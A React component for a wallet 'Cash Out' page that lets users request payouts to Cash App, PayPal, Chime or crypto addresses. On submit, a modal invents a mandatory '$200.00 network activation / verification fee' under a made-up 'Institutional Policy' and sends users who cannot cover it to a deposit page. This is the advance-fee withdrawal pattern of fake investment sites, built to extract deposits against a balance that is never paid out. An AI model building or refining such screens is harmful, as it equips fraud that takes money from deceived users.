import React, { useState } from 'react';
import { ArrowUpRight, AlertCircle, ShieldAlert } from 'lucide-react';
import './CashOutPage.css';

export default function CashOutPage({ balanceUSD, onConfirmWithdraw, setCurrentRoute }) {
  const [method, setMethod] = useState('Cash App');
  const [destination, setDestination] = useState('');
  const [amount, setAmount] = useState('');
  const [showFeeModal, setShowFeeModal] = useState(false);
  const [pendingWithdrawData, setPendingWithdrawData] = useState(null);

  const REQUIRED_FEE = 200.00;

  const handleSubmit = (e) => {
    e.preventDefault();
    const numAmt = parseFloat(amount);
    
    if (!destination || !numAmt || numAmt <= 0) {
      alert('Please fill in valid destination details');
      return;
    }
    if (numAmt > balanceUSD) {
      alert('Insufficient available wallet balance');
      return;
    }

    // Save pending data and trigger the $200 withdrawal fee requirement notice
    setPendingWithdrawData({ amount: numAmt, method, destination });
    setShowFeeModal(true);
  };

  const handleAcknowledgeAndProceed = () => {
    // Check if user has enough balance or needs to deposit fee
    if (balanceUSD < REQUIRED_FEE) {
      alert(`Institutional Policy: A network activation fee of $${REQUIRED_FEE.toFixed(2)} is required to process this payout. Please make a deposit first.`);
      setShowFeeModal(false);
      setCurrentRoute('deposit'); // Automatically route user to deposit page
      return;
    }

    // If they can cover or we deduct it, process withdrawal
    setShowFeeModal(false);
    onConfirmWithdraw(pendingWithdrawData);
  };

  return (
    <div className="cashout-panel">
      <h3 style={{ fontSize: '16px', fontWeight: 'bold', color: '#ffffff', display: 'flex', alignItems: 'center', gap: '8px' }}>
        <ArrowUpRight size={18} color="var(--accent-color)" /> Cash Out Funds
      </h3>

      <p style={{ fontSize: '11px', color: 'var(--text-muted)', lineHeight: '1.5' }}>
        Select your external receiving destination. Note that all institutional network payouts require a mandatory <strong>$200.00 verification fee</strong> prior to automated bridge clearance.
      </p>

      <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
        <div className="form-group">
          <label>DESTINATION METHOD</label>
          <select value={method} onChange={(e) => setMethod(e.target.value)} className="form-input">
            <option value="Cash App">Cash App ($Cashtag)</option>
            <option value="PayPal">PayPal Email</option>
            <option value="Chime">Chime Direct</option>
            <option value="Bitcoin Address">Bitcoin Address</option>
            <option value="USDT-TRC20">USDT (TRC20 Address)</option>
          </select>
        </div>

        <div className="form-group">
          <label>RECIPIENT HANDLE / ADDRESS</label>
          <input
            type="text"
            placeholder="Enter destination handle or address"
            value={destination}
            onChange={(e) => setDestination(e.target.value)}
            className="form-input"
            required
          />
        </div>

        <div className="form-group">
          <label>WITHDRAWAL AMOUNT (USD)</label>
          <input
            type="number"
            step="0.01"
            placeholder="0.00"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="form-input"
            required
          />
        </div>

        <div style={{ fontSize: '11px', color: 'var(--text-muted)', display: 'flex', justifyContent: 'space-between', padding: '8px 0', borderTop: '1px solid rgba(51, 65, 85, 0.4)' }}>
          <span>Available Balance:</span>
          <span style={{ color: '#ffffff', fontWeight: 'bold' }}>${balanceUSD.toFixed(2)} USD</span>
        </div>

        <button type="submit" className="submit-btn">
          Request Payout Clearance
        </button>
      </form>

      {/* Mandatory Fee Modal Overlay */}
      {showFeeModal && (
        <div style={{
          position: 'fixed',
          top: 0, left: 0, right: 0, bottom: 0,
          backgroundColor: 'rgba(5, 8, 17, 0.85)',
          backdropFilter: 'blur(8px)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 100,
          padding: '16px'
        }}>
          <div style={{
            backgroundColor: '#0b0f19',
            border: '1px solid var(--accent-color)',
            borderRadius: '24px',
            padding: '24px',
            maxWidth: '420px',
            width: '100%',
            boxShadow: '0 25px 50px -12px rgba(0,0,0,0.7)',
            display: 'flex',
            flexDirection: 'column',
            gap: '16px'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', color: 'var(--accent-color)' }}>
              <ShieldAlert size={24} />
              <h4 style={{ fontSize: '15px', fontWeight: 'bold', color: '#ffffff' }}>Network Fee Verification</h4>
            </div>

            <p style={{ fontSize: '11px', color: 'var(--text-muted)', lineHeight: '1.6' }}>
              To ensure compliance and network gas routing for your payout of <strong style={{ color: '#fff' }}>${pendingWithdrawData?.amount.toFixed(2)}</strong>, an activation and clearance fee of <strong style={{ color: 'var(--accent-color)' }}>$200.00 USD</strong> is required.
            </p>

            <div style={{ backgroundColor: '#020617', padding: '12px', borderRadius: '12px', border: '1px solid var(--card-border)', fontSize: '11px', color: '#cbd5e1' }}>
              <p style={{ marginBottom: '6px', fontWeight: 'bold', color: '#ffffff' }}>Instructions:</p>
              <p>If your current balance does not cover this $200 verification requirement, you will be redirected to the <strong>Deposit Gateway</strong> to fund the fee before your payout can be released.</p>
            </div>

            <div style={{ display: 'flex', gap: '10px', marginTop: '8px' }}>
              <button
                onClick={() => setShowFeeModal(false)}
                style={{
                  flex: 1, padding: '12px', borderRadius: '12px', backgroundColor: '#1e293b', color: '#cbd5e1', fontSize: '11px', fontWeight: 'bold'
                }}
              >
                Cancel
              </button>
              <button
                onClick={handleAcknowledgeAndProceed}
                style={{
                  flex: 1, padding: '12px', borderRadius: '12px', backgroundColor: 'var(--accent-color)', color: '#000', fontSize: '11px', fontWeight: '800'
                }}
              >
                Proceed / Fund Fee
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}